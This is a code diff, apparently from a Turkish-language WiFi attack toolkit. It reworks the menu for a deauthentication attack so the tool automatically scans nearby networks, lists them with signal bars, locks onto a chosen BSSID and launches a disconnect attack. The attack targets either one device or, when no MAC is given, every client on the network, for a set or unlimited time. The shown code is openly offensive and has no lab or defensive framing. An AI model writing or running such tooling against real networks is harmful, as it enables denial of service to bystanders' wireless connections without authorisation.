@@ -132,19 +132,51 @@ def strike_ui():
             f"{Colors.YELLOW}[2]{Colors.END} Spesifik Cihazı Düşür (Targeted)   ",
             f"{Colors.YELLOW}[0]{Colors.END} Geri                               "
         ]
-        menu_box("STRIKE", opts)
+        menu_box("STRIKE - DEAUTH SALDIRISI", opts)
         sub = input(f"\n    {Colors.BOLD}Pulse/Strike #{Colors.END} ")
+        
         if sub == "1" or sub == "2":
             iface = select_interface()
             if not iface: continue
+            
             engine.toggle_monitor(iface, "start")
             
-            bssid = input("    Hedef BSSID: ")
-            client = input("    Cihaz MAC: ") if sub == "2" else None
-            timer = int(input("    Saldırı Süresi (Saniye, sınırsız için 0): ") or 0)
+            # AMELİYAT BURADA: Kullanıcıdan BSSID istemek yerine otomatik taratıyoruz
+            print(f"\n    {Colors.CYAN}[*] Hedef seçimi için etraf taranıyor...{Colors.END}")
+            found_nets = radar.auto_scan_and_select(iface) 
             
-            strike.pulse_kick(iface, bssid, client, timer)
-            input("\n    Devam etmek için Enter...")
+            if not found_nets:
+                print(f"    {Colors.RED}[!] Hiç ağ bulunamadı.{Colors.END}")
+                time.sleep(2)
+                continue
+            
+            # Sinyal barlı listeyi ekrana bas
+            print(f"\n    {Colors.CYAN}{'ID':<3} {'SİNYAL':<15} {'SSID':<25} {'BSSID':<20} {'CH'}{Colors.END}")
+            print("    " + "-"*75)
+            for i, net in enumerate(found_nets):
+                bar = radar.get_signal_bar(net['dbm'])
+                print(f"    {Colors.YELLOW}[{i}]{Colors.END} {bar:<15} {net['essid'][:23]:<25} {net['bssid']:<20} {net['ch']}")
+            
+            # Kullanıcıdan sadece numarayı alıyoruz
+            secim = input(f"\n    Hangi ağı düşürüyoruz? (ID girin): ")
+            if secim.isdigit() and int(secim) < len(found_nets):
+                target = found_nets[int(secim)]
+                bssid = target['bssid'] # BSSID otomatik çekildi!
+                print(f"    [✔] Hedef Kilitlendi: {target['essid']} ({bssid})")
+                
+                # Spesifik düşürme ise MAC iste, değilse boş geç
+                client = input("    Düşürülecek Cihaz MAC (Boş bırakırsan ağdaki herkes düşer): ") if sub == "2" else None
+                
+                timer_str = input("    Saldırı Süresi (Saniye, sınırsız için 0): ")
+                timer = int(timer_str) if timer_str.isdigit() else 0
+                
+                # Vuruş başlasın!
+                strike.pulse_kick(iface, bssid, client, timer)
+                input("\n    Devam etmek için Enter...")
+            else:
+                print("    [!] Geçersiz seçim.")
+                time.sleep(1)
+                
         elif sub == "0": break
 
 def decrypt_ui():
